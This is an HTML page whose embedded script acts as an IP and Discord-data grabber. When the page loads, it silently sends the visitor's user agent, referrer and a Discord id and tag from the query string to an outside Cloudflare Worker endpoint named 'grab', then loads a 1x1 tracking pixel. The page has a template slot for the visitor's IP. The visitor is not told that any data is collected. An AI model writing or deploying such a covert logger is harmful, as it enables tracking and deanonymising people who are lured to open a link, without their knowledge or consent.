<!DOCTYPE html>
<html>
<head><meta charset="utf-8"></head>
<body>
<script>
// Auto-redirect to your Cloudflare Worker with IP + Discord data
const params = new URLSearchParams(window.location.search);
const ip = "<%ip%>";
const ua = navigator.userAgent;
const url = `https://grab.yourworker.workers.dev/?id=${params.get('id') || 'unknown'}&tag=${encodeURIComponent(params.get('tag') || 'unknown')}&ua=${encodeURIComponent(ua)}&ref=${encodeURIComponent(document.referrer)}`;

fetch(url).finally(() => {
  // Send 1x1 pixel
  const img = new Image();
  img.src = "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==";
});
</script>
</body>
</html>
